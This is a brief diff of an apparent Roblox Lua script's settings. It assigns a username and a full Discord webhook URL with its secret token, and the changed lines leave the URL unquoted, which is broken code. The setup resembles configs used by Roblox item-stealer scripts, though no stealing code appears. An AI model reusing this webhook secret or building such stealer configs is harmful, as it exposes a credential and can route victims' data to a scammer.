@@ -1,8 +1,8 @@
 Roblox_Username = "MargarinePool"
-Discord_Webhook = "https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4"
+Discord_Webhook = ""
 
-Username = Username
-Webhook = Webhook
+Username = MargarinePool
+Webhook = https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4
 
 if selectedLoadingScreen == nil or selectedLoadingScreen == "" then
     selectedLoadingScreen = "1"
